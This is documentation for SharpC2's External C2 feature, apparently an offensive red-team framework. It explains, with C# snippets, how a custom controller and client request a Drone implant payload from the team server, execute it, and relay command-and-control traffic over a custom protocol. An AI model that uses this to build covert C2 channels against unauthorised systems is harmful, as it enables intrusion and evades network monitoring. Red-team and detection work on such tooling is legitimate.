External C2
===========

External C2 allow a 3rd application to act as a communication layer between the SharpC2 team server and Drone payload.  This allows you to implement completely custom C2 protocols without having to modify the core framework.

.. graphviz::

   digraph foo {
    rankdir="LR";
    node [shape=box];

    teamserver [label="Team Server"];
    controller [label="Controller"];
    client [label="Client"];
    drone [label="Drone"];

    teamserver -> controller [label="C2 Frames"];
    controller -> client [label="Custom C2"];
    client -> drone [label="C2 Frames"];

    controller -> teamserver;
    client -> controller;
    drone -> client
   }


|

ExternalC2.NET
--------------

The SharpC2 solution contains a .NET library to simplify the process of implementing ExternalC2.  Example Controller and Client projects are also provided.


3rd Party Controller
--------------------

The controller can leverage the ``ExternalC2.NET.Server`` namespace.  It must instantiate a new ``ServerController`` class with the IP address and port of the ExternalC2 handler, and then call ``Connect``.


.. code-block::

    if (args.Length != 2)
        {
            Console.WriteLine("demo-controller.exe <address> <port>");
            return;
        }

        var target = IPAddress.Parse(args[0]);
        var port = int.Parse(args[1]);

        // connect to the team server
        var controller = new ServerController(target, port);

        if (!await controller.Connect())
        {
            Console.WriteLine($"Failed to connect to {target}:{port}.");
            return;
        }


It then requests an SMB payload from the team server by providing a pipename.  This is returned in the form of a ``byte[]``.

.. code-block::

    // request payload
    var payload = await controller.RequestPayload(pipename);


The controller must then provide the payload to the 3rd party client.  The client will also need to know the pipename (this could be generated by the client and given to the controller over the custom C2 protocol).  It can then drop into a loop to continuously relay data from the 3rd party client to the team server.

.. code-block::

    while (your client is connected)
    {
        if (client has data)
        {
            // read from client
            var inbound = await YourReadMethod();
                
            // send it to team server
            await controller.SendData(inbound);
                
            // read data from team server
            var outbound = await controller.ReadData();
                
            // send it to the client
            await YourSendMethod(outbound);
        }

        await Task.Delay(100);
    }


3rd Party Client
----------------

The client can leverage the ``ExternalC2.NET.Client`` namespace.  It should initiate communication with your 3rd controller and either send or receive a pipename.  A ``ClientController`` class should be instantiated using that pipename.

.. code-block::

    var controller = new ClientController(pipename);


Once the payload has been received from the 3rd party controller, call the ``ExecutePayload`` method.  This will execute the Drone payload and attempt to connect to its SMB named pipe.

.. code-block::

    if (!await controller.ExecutePayload(payload))
    {
        Console.WriteLine("Failed to connect to pipe");
        return;
    }

It can then drop into a loop to continuously relay data from the drone to the 3rd party controller.

.. code-block::

    while (you're connected to the controller)
    {
        // read from drone
        var outbound = await controller.ReadDrone();

        // send to controller
        await YourSendMethod(outbound);

        // read from controller
        var inbound = await YourReadMethod();

        // send to drone
        await controller.SendDrone(inbound);

        await Task.Delay(100);
    }